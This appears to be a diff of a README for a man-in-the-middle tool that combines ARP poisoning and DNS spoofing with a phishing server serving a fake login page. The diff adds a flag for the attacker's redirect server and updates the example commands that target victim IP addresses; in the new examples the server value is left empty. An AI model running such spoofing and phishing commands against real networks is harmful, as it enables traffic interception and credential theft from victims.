@@ -24,6 +24,7 @@ This project implements a Man-in-the-Middle (MITM) attack tool combining ARP Poi
 |----------|-------------|
 | **ATTACKER_IP** | IP address of the attacker's machine (auto-detected from interface) |
 | **VICTIM_IP** | IP address of the target victim (provided via `--target` flag) |
+| **SERVER_IP** | IP address of the attacker's server to redirect to (provided via `--server` flag) |
 | **INTERFACE** | Network interface to use (provided via `--interface` flag) |
 | **GATEWAY_IP** | IP address of the network gateway (auto-detected) |
 | **MODE** | Attack mode: `SILENT` or `ALL_OUT` (provided via `--mode` flag) |
@@ -67,16 +68,16 @@ A separate fake login page.
 
 ### Running the MITM Attack
 ```bash
-sudo python3 mitm_spoofer.py --interface <interface> --mode <SILENT|ALL_OUT> --target <victim_ip>
+sudo python3 mitm_spoofer.py --interface <interface> --mode <SILENT|ALL_OUT> --target <victim_ip> --server <server_ip>
 ```
 
 **Examples:**
 ```bash
 # ALL_OUT mode - spoof all DNS queries
-sudo python3 mitm_spoofer.py --interface wlp0s20f3 --mode ALL_OUT --target 192.148.127.111
+sudo python3 mitm_spoofer.py --interface wlp0s20f3 --mode ALL_OUT --target 192.148.127.111 --server 
 
 # SILENT mode - targeted spoofing (will prompt for domain)
-sudo python3 mitm_spoofer.py --interface eth0 --mode SILENT --target 192.148.1.50
+sudo python3 mitm_spoofer.py --interface eth0 --mode SILENT --target 192.148.1.50 --server 
 ```
 
 ### Running the Phishing Server (Separate Terminal)
